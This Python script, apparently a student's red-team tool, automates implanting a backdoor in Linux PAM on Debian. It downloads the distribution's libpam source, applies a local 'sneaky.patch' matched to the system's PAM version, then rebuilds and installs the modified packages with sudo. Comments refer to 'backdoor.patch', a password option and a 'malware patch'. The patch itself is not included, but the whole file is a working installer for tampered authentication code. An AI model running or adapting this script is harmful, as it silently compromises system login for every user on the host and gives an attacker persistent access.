#Liam Best
#lcb3455
import argparse
import os
import subprocess
import tarfile
from pathlib import Path

PATCHES = {
    "1.7.0": "sneaky.patch",
    "1.6.1": "sneaky.patch",
    "1.6.0": "sneaky.patch",
    "1.5.2": "sneaky.patch",
    "1.5.1": "sneaky.patch",
    "1.5.0": "sneaky.patch",
}


# PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"

#how to run
def show_help():
    print("")
    print("Example usage: PAM.py -v 1.7.2 -p test")
    print("For a list of supported versions: https://github.com/linux-pam/linux-pam/releases")

#check installed pam version so i dont destroy systems
def get_system_pam_version():
    result = subprocess.run(
        ["dpkg-query", "-W", "-f=${Version}", "libpam0g"],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        return None
    return result.stdout.strip()

#me no like when -5 at the end
def normalize_version(ver):
    # "1.7.0-5" → "1.7.0"
    return ver.split("-")[0]
    
#runs things on command line
def run_cmd(cmd, cwd=None):
    print(f"[+] Running: {' '.join(cmd)} (cwd={cwd or os.getcwd()})")
    result = subprocess.run(cmd, cwd=cwd)
    if result.returncode != 0:
        raise RuntimeError(f"Command failed: {' '.join(cmd)}")
    return result

#downloads files
def download_file(url, dest):
    print(f"[+] Downloading {url} -> {dest}")
    run_cmd(["wget", "-c", url])

def fetch_debian_pam_source():
    run_cmd(["apt-get", "source", "libpam0g"])
    # Find the extracted directory
    for d in os.listdir("."):
        if d.startswith("linux-pam-"):
            return d
    raise RuntimeError("Debian PAM source not found")

#attempts to download the correct type of file from the PAM GitHub page, which uses two formats .tar.gz and .tar.xz
# def try_download(version):
#     # tar.gz format
#     # pam_dir = f"linux-pam-{version}"
#     pam_file = f"Linux-PAM-{version}.tar.gz"
#     url = f"{PAM_BASE_URL}/{pam_file}"
#     try:
#         download_file(url, pam_file)
#         pam_dir = f"Linux-PAM-{version}"
#         return pam_dir, pam_file
#     except RuntimeError:
#         print("tar.gz no work :( ")

#     # tar.xz format
#     # pam_dir = f"linux-pam-Linux-PAM-{version}"
#     pam_file = f"Linux-PAM-{version}.tar.xz"
#     url = f"{PAM_BASE_URL}/{pam_file}"
#     try:
#         download_file(url, pam_file)
#         pam_dir = f"Linux-PAM-{version}"
#         return pam_dir, pam_file
#     except RuntimeError:
#         print("well thats not good uhhhh tar.xz no work gg")

# extracts/unpacks the source tree so that it can be changed in later steps
def extract_tarball(pam_file):
    print(f"[+] Extracting {pam_file}")
    with tarfile.open(pam_file, "r:*") as tar:
        tar.extractall()

def build_debian_pam(pam_dir):
    run_cmd(["sudo", "apt-get", "build-dep", "-y", "libpam0g"])
    run_cmd(["dpkg-buildpackage", "-b", "-uc", "-us"], cwd=pam_dir)

def install_built_packages():
    for f in os.listdir(".."):
        if f.startswith("libpam") and f.endswith(".deb"):
            run_cmd(["sudo", "dpkg", "-i", f], cwd="..")

def apply_patch(pam_dir, patch_file):
    patch_path = Path(__file__).parent / patch_file
    run_cmd(["patch", "-p1", "-i", str(patch_path)], cwd=pam_dir)

# applies a patch that changes the PAM file, then configures, compiles, and installs the new changes to take effect
# def build_pam(pam_dir: str, patch_file: str):
#     script_dir = Path(__file__).parent
#     patch_path = Path(__file__).parent / patch_file
#     subprocess.run(
#     ["patch", "-p1", "-d", pam_dir],
#     input=patch_path.read_bytes(),
# )

#     pam_path = Path(pam_dir)
    
#     # if not pam_path.exists():
#     #     raise FileNotFoundError(f"{pam_dir} does not exist after extraction")

#     # If ./configure does not exist, run ./autogen.sh
#     # configure_path = pam_path / "configure"
#     # if not configure_path.exists():
#     #     print("[+] ./configure not found, running ./autogen.sh")
#     #     run_cmd(["./autogen.sh"], cwd=str(pam_path))

#     # print("[+] Running ./configure")
#     # run_cmd(["./configure"], cwd=str(pam_path))

#     # print("[+] Running make")
#     # run_cmd(["make"], cwd=str(pam_path))

#     # subprocess.run(
#     #     #["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
#     #     ["patch", "-p1", "-d", pam_dir], input=patch_path.read_bytes(),
#     # )
    
#     print("[+] Setting up meson")
#     run_cmd(["meson", "setup", "build"], cwd=str(pam_path))
    
#     print("[+] compilin")
#     run_cmd(["meson", "compile", "-C", "build"], cwd=str(pam_path))

#     print("[+] install")
#     run_cmd(["meson", "install", "-C", "build"], cwd=str(pam_path))

#     print("[+] Build complete")

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-h", action="store_true")
    # parser.add_argument("-?", dest="qmark", action="store_true")
    parser.add_argument("-v", "--version", required=True, type=str)
    # parser.add_argument("-p", dest="password")
    args = parser.parse_args()

    system_ver_raw = get_system_pam_version()
    if system_ver_raw:
        system_ver = normalize_version(system_ver_raw)
        print(f"[+] System PAM version detected: {system_ver_raw} (normalized: {system_ver})")

        # If user-supplied version mismatches system version, override
        if args.version.strip() != system_ver:
            print(f"[!] WARNING: You requested PAM {args.version}, "f"but the system uses {system_ver}.")
            print("[!] Using system version to avoid ABI mismatch.")
            version = system_ver
        else:
            version = args.version.strip()
    else:
        print("[!] Could not detect system PAM version. Using user-supplied version. Good luck, you're prob breaking something.")
        version = args.version.strip()
        
    if version in PATCHES:
        patch_file = PATCHES[version]
    else:
        print(f"[!] No patch availible for PAM {version} exiting")
        return
        
    # version = args.version.strip()
    # password = args.password
    # args, unknown = parser.parse_known_args()

    print("Automatic Debian PAM Workflow")
    print(f"PAM Version: {version}")
    # print(f"Password: {password}")
    print("")

    print("[+] Fetching Debian PAM source package...") 
    pam_dir = fetch_debian_pam_source() 
    print(f"[+] Debian PAM source extracted to: {pam_dir}") 
    
    print("[+] Applying patch...") 
    apply_patch(pam_dir, patch_file) 
    
    print("[+] Building Debian PAM packages...") 
    build_debian_pam(pam_dir) 
    
    print("[+] Installing built PAM packages...") 
    install_built_packages() 
    print("[+] Debian PAM build + install complete.")

    # global PAM_BASE_URL
    # PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"

    # try:
    #     pam_dir, pam_file = try_download(version)
    # except RuntimeError as e:
    #     print(f"[!] downlaod no worky: {e}")
    #     return

    # print(f"[+] Downloaded: {pam_file}")
    # print(f"[+] Extract directory: {pam_dir}")

    # # Check for patch
    # result = subprocess.run(["which", "patch"])
    # if result.returncode != 0:
    #     print("Error: patch command not found. Exiting")
    #     raise SystemExit(1)

    # # unpacks downloaded source archive
    # extract_tarball(pam_file)
    # # runs the build process on the extracted source (MAKE THE MALWARE PATCH HERE)
    # build_pam(pam_dir, patch_file)

if __name__ == "__main__":
    main()
